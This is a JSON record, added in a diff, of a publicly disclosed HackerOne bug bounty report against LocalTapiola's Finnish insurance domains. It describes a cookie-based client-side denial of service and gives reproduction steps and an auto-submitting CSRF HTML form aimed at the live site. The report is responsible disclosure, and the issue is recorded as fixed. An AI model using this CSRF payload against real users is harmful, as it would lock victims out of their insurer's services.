@@ -1,0 +1,134 @@
+{
+  "id": 129001,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjkwMDE=",
+  "url": "https://hackerone.com/reports/129001",
+  "title": "Cookie-based client-side denial-of-service to all of the Lähitapiola domains",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2016-04-07T13:21:42.998Z",
+  "submitted_at": "2016-04-07T13:21:42.998Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "putsi",
+    "url": "/putsi",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/044/111/aa19edadf036d52f4b00a706913bf4d957a21d3d_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 8416,
+    "url": "https://hackerone.com/localtapiola",
+    "handle": "localtapiola",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "LocalTapiola",
+      "twitter_handle": "",
+      "website": "http://www.lahitapiola.fi",
+      "about": "LocalTapiola’s products and services cover non-life, life and pension insurance, as well as investment and saving services."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2016-08-30T19:13:39.074Z",
+  "bug_reporter_agreed_on_going_public_at": "2016-08-30T19:13:38.934Z",
+  "team_member_agreed_on_going_public_at": "2016-08-30T18:34:23.758Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "# Cookie-based client-side denial-of-service to all of the Lähitapiola domains\n\nTime of detection: 23.2.2016 03:00-04:00\n\nAffected URL: https://www.lahitapiola.fi/cs/Satellite?pagename=LahiTapiola/LTStatus&cookieName=selectedArea&cookieValue=1&backurl=http://www.lahitapiola.fi\n\n## Description:\nAfter the victim opens the affected URL (by direct URL or via CSRF), the victim cannot access any of the Tapiola-domains (see the list below).\nThe vulnerability affects anonymous AND authenticated users.\nThis full client-side denial-of-service will last until the \"selectedArea\"-cookie expires which is about 10 years from the last login. Customer can recover from the condition by deleting the \"selectedArea\"-cookie.\n\n## List of domains which cannot be used by the client:\n- www.tapiola.fi\n- www.lahitapiola.fi\n- verkkopalvelu.tapiola.fi\n- yrityspalvelu.tapiola.fi\n\n## Steps to reproduce:\n1. Navigate either directly or via CSRF-attack to following URL:\n - https://www.lahitapiola.fi/cs/Satellite?pagename=LahiTapiola/LTStatus&cookieName=selectedArea&cookieValue=1&backurl=http://www.lahitapiola.fi\n2. Try to open www.tapiola.fi and notice that a white screen is returned.\n3. Try to open www.lahitapiola.fi and notice that a white screen is returned.\n4. Try to open verkkopalvelu.tapiola.fi and notice that a white screen is returned.\n5. Try to open yrityspalvelu.tapiola.fi and notice that a white screen is returned.\n6. Delete browser cookies and notice that you can now browse the Lähitapiola-website normally.\n\n## CSRF proof-of-concept:\n\n<html>\n  <body>\n    <form action=\"https://www.lahitapiola.fi/cs/Satellite\">\n      <input type=\"hidden\" name=\"pagename\" value=\"LahiTapiola&#47;LTStatus\" />\n      <input type=\"hidden\" name=\"cookieName\" value=\"selectedArea\" />\n      <input type=\"hidden\" name=\"cookieValue\" value=\"1\" />\n      <input type=\"hidden\" name=\"backurl\" value=\"http&#58;&#47;&#47;www&#46;lahitapiola&#46;fi\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n    <script>\n      document.forms[0].submit();\n    </script>\n  </body>\n</html>\n",
+  "weakness": {
+    "id": 45,
+    "name": "Cross-Site Request Forgery (CSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2016-09-29T18:34:23.891Z",
+  "allow_singular_disclosure_after": -232651917.1203893,
+  "singular_disclosure_allowed": true,
+  "vote_count": 15,
+  "voters": [
+    "mr-medi",
+    "putsi",
+    "roland_hack",
+    "woltage",
+    "yaworsk",
+    "zombiehelp54",
+    "its_afolic",
+    "muhammad_uwais",
+    "eveeez",
+    "l1nkworld",
+    "and 5 more..."
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "id": 2484,
+      "category": "team",
+      "content": "##Issue\n\nThe reporter was able to craft a CSRF (and direct URL) that triggered a single user denial of service by modifying a cookie. The affected user had to manually delete the selectedArea -cookie to resolve the situation.  The report contained a thorough PoC which assisted the triaging process.\n\n##Fix\n\nThe issue was investigated and found to be valid. The flaw was simple as such but proved to be multifaceted and the fix required a few iterations to cover all aspects. \n\n##Reasoning\n\nThe reported case was valid and within the scope of the bug bounty program. The issue was fixed and the reporter was awarded with a bounty. \n",
+      "user": {
+        "id": 60017,
+        "username": "localtapiola-thomas",
+        "name": "localtapiola-thomas",
+        "bio": "LocalTapiola Bug Bounty Coordinator - @tsmalmbe",
+        "cleared": false,
+        "verified": false,
+        "website": "http://www.lahitapiola.fi",
+        "location": "Espoo, Finland",
+        "created_at": "2016-03-09T13:58:17.117Z",
+        "url": "https://hackerone.com/localtapiola-thomas",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/60f411638706d89ae3052af6fe8b88fa9a798e291deee40f6a22e81418d78d5f"
+        }
+      },
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": []
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
